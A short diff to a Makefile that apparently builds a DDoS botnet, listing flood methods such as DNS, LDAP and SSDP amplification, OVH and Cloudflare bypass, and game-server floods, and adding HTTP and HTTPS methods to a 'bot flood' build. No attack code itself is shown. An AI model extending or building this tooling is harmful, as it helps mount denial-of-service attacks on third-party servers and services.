@@ -4,7 +4,7 @@ CXXFLAGS = -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections 
 
 METHODS = dns udp ldap ssdp home udpbypass tcp socket ovh tcpmix tcpbypass ack \
           game rainbow rocket roblox fivem pubg fortnite warthunder counter samp \
-          subnet icmp httpx rapidflood tls tlsx bypass browser cache cloudflare
+          subnet icmp http https httpx rapidflood tls tlsx bypass browser cache cloudflare
 
 all: bot flood http https symlinks
 
